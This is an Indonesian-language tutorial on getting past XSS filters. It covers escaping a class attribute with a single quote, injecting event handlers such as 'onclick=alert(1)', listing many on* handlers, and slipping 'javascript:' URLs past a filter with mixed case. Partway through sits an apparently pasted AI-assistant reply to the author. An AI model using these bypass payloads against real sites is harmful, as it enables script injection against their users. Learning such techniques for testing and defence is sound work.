# Evading Filter XSS / menghindari filter

Filter XSS ini melihat nilai, menggantinya, menghapusnya, atau memblokirnya jika sesuatu tampak berbahaya.

## Attribute Breakout With Escaping

Jika kita melihat URL misalnya seperti ini:

`https://target.com/page#beautiful`

Kemudian saat kita inspect, terlihat seperti ini:

```html
<div id="value" class="text-center">
  <button class="title beautiful">
    Toggle Theme
    </button>
</div>
```

Kita bisa melihat di sini ada atribut `class` yang berisi `title` dan `beautiful`.
Dan misalnya ketika kita klik button, lalu kita lihat URL berubah menjadi:

`https://target.com/page#ugly`

Dan jika kita Inspect ement lagi,,kita akan melihat jug kalau it ujuga berubah menjadi :

```html
<div id="value" class="text-center">
  <button class="title ugly">
    Toggle Theme
    </button>
</div>
```

Kita sudah tahu,bahwa kita bisa memasukkan payload ke dalam input,tetapi URL juga bia di kontrol,karena cukup mudah untuk mengubah sebagiannya dan mengirim tautan ke korban.

## Contoh Attack

Kita akan coba untuk mengganti URl nya menjadi seprti ini :

`https://target.com/page#"><script>alert(1)</script>`

dan jika kita lihat di inspect,,kita akan melihat seperti ini :

```html
<div id="value" class="text-center">
  <button class="title "><filtered>alert(1)</filtered>">
    Toggle Theme
  </button>
</div>
```

Bisa kita lihat,disini kita blum keluar dari atribut.Jadi pertama-tama,kita harus menyelesaikan ini sebelum melanjutakn,karena kita tidak dapat melakukan hal lain sampai kita memperbaikinya.

Dari yagn kita lihat sekarang,tampak nya musatahil karena tanda kutip ganda (") tidak keluar dari atribut yagn di kutip ganda ("")..

Tapi,inspector akan selalu menampilkan atribut dalam tanda kutip ganda (") bahkan ketika bukan begitu masalahnya.Jadi kita akan mencoab degan single quote (').

`https://target.com/page#'><script>alert(1)</script>`

Dan jida kita Inspect lagi,maka akan menjadi seperti ini :

```html
<div id="value" class="text-center">
  <button class="title " &gt;&lt;filtered&gt;alert(1)&lt;=""filtered&gt;'="">
    Toggle Theme
  </button>
</div>
```


Disini,kita bisa lihat kalau single quote berhasil,tapi masalahnay sekarang adalah karakter `<` dan `>` di escape HTML dan kata `script`,sedang di filter dan di ganti menjadi `filtered`.Dengan kata lain,kalau kita inject basic script akan menjadi sangat tidak mungkin.Mungkin disni kita berpikir untk menggunakan `href=javascript:alert(1)` atau `src=javascript:alert(1)`,tai itu tidak akan berhasil karena element `button` tidak mengambil konten dari halaman web.Jadi kita butuh sesuatu yang lebih baik.

**Event** adalah tindakan yagn terjadi di dalam browser seprti klik dan penekanan tombol,dan **event handlers** adalah cara untuk menjalankan kode javascript ketika ini terjadi dan dapat di atur menggunakan atribut HTML yang sudah kita ketahui.

Penjelasan kamu sudah benar, tapi bisa dirapikan sedikit biar lebih presisi dan enak dibaca—terutama kalau dipakai buat dokumentasi atau catatan bug hunting.

---

**Konsep Dasar Event Handler Attribute (HTML)**

Nama atribut biasanya diawali dengan `on`, lalu diikuti nama event seperti `click`, `mouseover`, `load`, dll.
Nilai dari atribut tersebut adalah kode JavaScript yang akan dieksekusi ketika event terjadi.

**Format umum:**

```
on<event>="javascript code"
```

---

**Contoh sederhana:**

* `onclick="alert(1)"`
* `onmouseover="alert(1)"`

---

**Contoh yang lebih banyak (berdasarkan berbagai event):**

**1. Mouse Events**

* `onclick="alert(1)"`
* `ondblclick="alert(1)"`
* `onmousedown="alert(1)"`
* `onmouseup="alert(1)"`
* `onmouseover="alert(1)"`
* `onmouseenter="alert(1)"`
* `onmouseleave="alert(1)"`
* `onmousemove="alert(1)"`

---

**2. Keyboard Events**

* `onkeydown="alert(1)"`
* `onkeypress="alert(1)"`
* `onkeyup="alert(1)"`

---

**3. Form Events**

* `onsubmit="alert(1)"`
* `onchange="alert(1)"`
* `oninput="alert(1)"`
* `onfocus="alert(1)"`
* `onblur="alert(1)"`

---

**4. Window / Document Events**

* `onload="alert(1)"`
* `onunload="alert(1)"`
* `onresize="alert(1)"`
* `onscroll="alert(1)"`

---

**5. Media Events**

* `onplay="alert(1)"`
* `onpause="alert(1)"`
* `onended="alert(1)"`
* `onvolumechange="alert(1)"`

---

**6. Event yang sering dipakai di XSS testing**

* `onerror="alert(1)"` (biasanya di `<img>`)
* `onload="alert(1)"`
* `onfocus="alert(1)"` (bisa auto trigger di beberapa kasus)
* `onmouseenter="alert(1)"`

---

**Contoh penggunaan di HTML:**

```html
<button onclick="alert(1)">Click me</button>
<img src="x" onerror="alert(1)">
<input type="text" onfocus="alert(1)">
```

Kembakli lagi ke payload kita,,kita akan mengganti semua yagn ada setelah **tanda kutip tunggal (')** dengan event handler untk memenggil `alert(1)`

jadi kita akan menggunkan payload seprti ini :

`'onclick=alert(1)`

Dan jika kia ingat kembali,kita kelua dari atribut dengan menggunakan **tanda kutip tunggal (')**,jadi itu berati akan ada tanda kutip tunggal tambahan di akhir,jadi kita perlu memasukkanya tetap sebelum `alert`,agar event handler kita di beri tanda kutip,sehinggan menjadi seprti ini :

`'onclick='alert(1)`


`https://target.com/page#'onclick=alert(1)`





## Javacsript URLS With Filtering

Contoh ketika di Inspect :

INPUT = `javascript:alert(1)`

```html
<div id="value" class="text-center">
  <a href="alert()">
<h1>alert()</h1>
  </a>

```

Kita bis melihat bahwa `javascript:`  di hapus sepenuhnya dan hany menyisakan `alert(1)`,karena Javascript URL normal sedang di filter.Mari kita berkreasi dan mencampur huruf kapital,seperti `javascriPt` ,`javaScript`,atau lainnya,atau tambahkn argumen new line,tabs,spasi,dan lain-lain.
